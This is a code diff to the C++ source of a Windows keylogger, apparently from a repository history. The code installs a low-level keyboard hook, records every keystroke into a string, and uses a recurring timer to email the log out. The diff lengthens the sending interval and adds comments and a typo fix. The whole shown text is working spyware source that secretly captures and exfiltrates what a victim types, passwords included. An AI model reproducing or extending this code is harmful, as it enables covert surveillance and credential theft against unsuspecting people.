@@ -13,12 +13,11 @@
 HHOOK eHook = NULL;
 
 //EDIT TIME INTERVAL HERE
-int timeInterval = 300 * 60;
+int timeInterval = 2000 * 60;
 std::string keylog = std::string();
 
 void SendEmailTimer();
 LRESULT KeyboardProc(int nCode, WPARAM wparam, LPARAM lparam);
-
 Timer MailTimer(SendEmailTimer, timeInterval, Timer::Infinite);
 
 bool InstalHook()
@@ -84,6 +83,8 @@ void SendEmailTimer()
 	keylog = std::string();
 }
 
+//Signed result of message processing.
+//Long Pointer to Constant Wide String
 LRESULT KeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
 {
 	//Propagate the hook
@@ -95,7 +96,7 @@ LRESULT KeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
 	//Struct that contains information about a low-level keyboard input event
 	KBDLLHOOKSTRUCT *kbs = (KBDLLHOOKSTRUCT *)lparam;
 
-	//Whenver you press a key
+	//Whenever you press a key
 	if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)
 	{
 		keylog += Keys::KEYS[kbs->vkCode].Name;
@@ -103,6 +104,7 @@ LRESULT KeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
 	//Hold down a key long enough to start the keyboard's repeat feature
 	else if (wparam == WM_KEYUP || wparam == WM_SYSKEYUP)
 	{
+		//Double Word, specifies its own size 
 		DWORD key = kbs->vkCode;
 		std::set<DWORD> specialVirtualKeys;
 
